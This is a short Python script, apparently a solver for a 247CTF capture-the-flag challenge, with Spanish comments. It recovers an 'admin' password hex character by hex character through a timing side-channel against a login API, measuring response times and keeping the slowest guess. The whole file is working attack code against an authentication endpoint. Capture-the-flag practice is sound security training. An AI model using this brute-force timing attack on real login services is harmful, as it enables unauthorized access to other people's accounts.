#!/usr/bin/env python3
import requests
import time
import sys

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    token = data["message"].split("reset to ")[1].rstrip("!")
    print(f"[+] Nuevo token: {token}", file=sys.stderr)
    return token

def try_password(username, password, api_token):
    start = time.time()
    resp = requests.post(
        f"{BASE_URL}/api/login",
        data={
            "username": username,
            "password": password,
            "api": api_token
        },
        timeout=10
    )
    elapsed = time.time() - start
    return resp.json(), elapsed

# Estrategia: con 128 requests, podemos hacer ~4 requests por posición
# Vamos a probar todos los caracteres una vez para las primeras 8 posiciones
# y ver si hay un patrón claro

api_token = get_token()
request_count = 0
known = ""

# Hacer solo las primeras 8 posiciones para ver si funciona el timing
for pos in range(min(8, 32)):
    print(f"\n[*] Posición {pos}:", file=sys.stderr)
    timings = {}
    
    for char in HEX_CHARS:
        if request_count >= 128:
            print("[!] Requests agotados!", file=sys.stderr)
            break
            
        test_password = known + char + "0" * (31 - pos)
        result, elapsed = try_password("admin", test_password, api_token)
        timings[char] = elapsed
        request_count += 1
        
        print(f"  {char}: {elapsed:.4f}s", file=sys.stderr)
        
        if result.get("result") == "success":
            print(f"\n[!] ¡LOGIN EXITOSO!", file=sys.stderr)
            print(f"Password: {test_password}", file=sys.stderr)
            print(f"Result: {result}", file=sys.stderr)
            sys.exit(0)
    
    if timings:
        # Ordenar por timing
        sorted_timings = sorted(timings.items(), key=lambda x: x[1], reverse=True)
        best_char = sorted_timings[0][0]
        best_time = sorted_timings[0][1]
        second_best_time = sorted_timings[1][1] if len(sorted_timings) > 1 else 0
        
        print(f"[+] Top 3: {sorted_timings[:3]}", file=sys.stderr)
        print(f"[+] Diferencia top 1-2: {best_time - second_best_time:.4f}s", file=sys.stderr)
        
        known += best_char
        print(f"[+] Conocido: {known}", file=sys.stderr)

print(f"\n[*] Contraseña parcial: {known}", file=sys.stderr)
print(f"[*] Requests usados: {request_count}/128", file=sys.stderr)
